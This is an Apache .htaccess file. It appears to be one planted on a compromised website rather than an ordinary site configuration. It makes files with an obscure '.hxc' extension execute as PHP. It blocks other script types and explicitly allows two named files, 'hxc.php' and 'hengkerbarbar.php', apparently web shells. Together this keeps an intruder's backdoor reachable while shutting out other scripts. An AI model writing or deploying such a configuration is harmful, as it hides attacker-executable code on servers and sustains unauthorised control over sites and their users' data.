AddHandler application/x-httpd-php .hxc
AddType application/x-httpd-php .hxc

<FilesMatch "\.(php[0-9]?|phtml|phar|inc|cgi|pl|py|exe|jsp|aspx?|dll|scr|com|bat|sh|bash|cmd|jar|vbs|vb|wsf|msi)$">
    Order allow,deny
    Deny from all
</FilesMatch>

<FilesMatch "\.(phar|pht|php|php[0-9]?|phtml)\.(jpg|jpeg|png|gif|pdf|doc|docx|xls|xlsx|txt|zip)$">
    Order allow,deny
    Deny from all
</FilesMatch>

<FilesMatch "\.(jpg|jpeg|png|webp|pdf|doc|docx|xls|xlsx|txt|css|js|html|zip)$">
    Order allow,deny
    Allow from all
</FilesMatch>

<FilesMatch "^(hxc.php|hengkerbarbar.php)$">
    Order allow,deny
    Allow from all
</FilesMatch>

Options -Indexes

<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
